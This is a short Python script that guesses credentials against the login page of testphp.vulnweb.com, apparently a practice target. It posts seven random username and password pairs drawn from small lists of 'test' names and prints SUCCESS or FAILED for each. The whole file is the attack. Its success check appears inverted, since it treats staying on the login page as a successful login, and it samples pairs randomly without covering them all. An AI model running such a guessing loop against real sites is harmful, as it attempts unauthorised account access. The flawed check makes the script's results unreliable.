import requests
import random

session = requests.Session()

login_url = 'http://testphp.vulnweb.com/login.php'
log_page = session.get(login_url)

usr = [
	'test',
	'test1',
	'test2',
	'test3',
	'test4',
	'test5',
	'test6',
]

passwd = [
	'test',
	'test1',
	'test2',
	'test3',
	'test4',
	'test5',
	'test6',
]

for i in range(7):
	user = random.choice(usr)
	pwd = random.choice(passwd)

	log_data = {'username': user, 'password': pwd}
	log_response = session.post(login_url, data=log_data)

	if log_response.url == login_url:
		print("")
		print("SUCCESS")
		print(f"URL : {login_url}")
		print(f"Username : {user}")
		print(f"Password : {pwd}")
	else:
		print("")
		print("FAILED")
		print(f"URL : {login_url}")
		print(f"Username : {user}")
		print(f"Password : {pwd}")
